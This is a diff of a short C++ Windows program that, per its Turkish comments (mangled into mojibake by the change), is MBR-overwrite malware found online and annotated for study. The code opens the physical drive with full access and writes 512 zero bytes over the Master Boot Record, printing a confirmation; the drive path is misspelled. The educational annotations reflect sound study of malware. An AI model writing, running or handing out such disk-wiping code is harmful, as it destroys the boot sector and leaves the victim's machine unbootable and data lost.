@@ -1,3 +1,6 @@
+/*
+	Ä°nternette bulduÄŸum Overwrite ZararlÄ± YazÄ±lÄ±mÄ±nÄ± Ã¶ÄŸrenme ve yorumlama 
+*/
 #include <Windows.h>
 #include <iostream>
 
@@ -9,16 +12,16 @@ int main()
 {
 	DWORD write;
 	char mbrData[MBR_SIZE]; 
-	ZeroMemory(&mbrData,(sizeof mbrData)); //Destination,Length //ZeroMemory belirtilen alanı belirtilen boyutta temizler
+	ZeroMemory(&mbrData,(sizeof mbrData)); //Destination,Length //ZeroMemory belirtilen alanÄ± belirtilen boyutta temizler
 										  
-    //Handle Windows nesneleri için bir çeşit işaretçidir
-	//CreateFile dosya oluşturur yada var olan dosya üzerinde işlem yapar
-	HANDLE MasterBootRecord = CreateFile("\\\\.\PyhsicalDriver0",//Dosyanın adı
-		GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,//Dosyanın açılma izinlerinin hepsi verildi ve Dosyanın paylaşım modları read ve write
-		NULL,OPEN_EXISTING,NULL,NULL); //Dosyanın durumu
+    //Handle Windows nesneleri iÃ§in bir Ã§eÅŸit iÅŸaretÃ§idir
+	//CreateFile dosya oluÅŸturur yada var olan dosya Ã¼zerinde iÅŸlem yapar
+	HANDLE MasterBootRecord = CreateFile("\\\\.\PyhsicalDriver0",//DosyanÄ±n adÄ±
+		GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,//DosyanÄ±n aÃ§Ä±lma izinlerinin hepsi verildi ve DosyanÄ±n paylaÅŸÄ±m modlarÄ± read ve write
+		NULL,OPEN_EXISTING,NULL,NULL); //DosyanÄ±n durumu
 	
-	//WriteFile: Verileri belirtilen dosya veya giriş / çıkış(G / Ç) aygıta yazar.
-	//Parametreler:dosya adı,verileri içeren ara bellek,boyut,yazılan bayt numarasını alır,çakışma durumu
+	//WriteFile: Verileri belirtilen dosya veya giriÅŸ / Ã§Ä±kÄ±ÅŸ(G / Ã‡) aygÄ±ta yazar.
+	//Parametreler:dosya adÄ±,verileri iÃ§eren ara bellek,boyut,yazÄ±lan bayt numarasÄ±nÄ± alÄ±r,Ã§akÄ±ÅŸma durumu
 	if (WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE)
 	{
 		cout << "Master Boot Record is over written !" << endl;
